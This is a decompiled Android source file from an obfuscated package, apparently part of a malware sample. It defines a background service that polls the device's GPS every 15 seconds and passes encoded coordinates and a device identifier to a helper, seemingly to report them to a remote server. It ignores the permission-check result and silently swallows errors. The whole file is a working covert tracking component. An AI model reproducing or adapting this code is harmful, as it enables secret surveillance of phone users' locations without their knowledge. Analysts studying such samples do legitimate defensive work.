package wocwvy.czyxoxmbauu.slsa;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;

/* JADX INFO: loaded from: classes.dex */
public class blkzyyyfc extends Service {

    /* JADX INFO: renamed from: b */
    public LocationManager f358b;

    /* JADX INFO: renamed from: a */
    C0020b f357a = new C0020b();

    /* JADX INFO: renamed from: c */
    private LocationListener f359c = new LocationListener() { // from class: wocwvy.czyxoxmbauu.slsa.blkzyyyfc.1
        @Override // android.location.LocationListener
        public void onLocationChanged(Location location) {
            blkzyyyfc.this.m267a(location);
        }

        @Override // android.location.LocationListener
        public void onProviderDisabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onProviderEnabled(String str) {
        }

        @Override // android.location.LocationListener
        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    };

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX INFO: renamed from: a */
    public void m267a(Location location) {
        if (location != null && location.getProvider().equals("gps")) {
            C0020b c0020b = this.f357a;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            sb.append(this.f357a.m242c(this.f357a.m264q(this) + ":" + m269b(location) + ":GPS:"));
            c0020b.m235b(this, "5", sb.toString());
        }
    }

    /* JADX INFO: renamed from: b */
    private String m269b(Location location) {
        return location == null ? "" : String.format("%1$.4f:%2$.4f", Double.valueOf(location.getLatitude()), Double.valueOf(location.getLongitude())).replace(",", ".");
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        this.f358b = (LocationManager) getSystemService("location");
        try {
            checkCallingOrSelfPermission("android.permission.ACCESS_FINE_LOCATION");
            this.f358b.requestLocationUpdates("gps", 15000L, 10.0f, this.f359c);
        } catch (Exception unused) {
        }
        return i;
    }
}
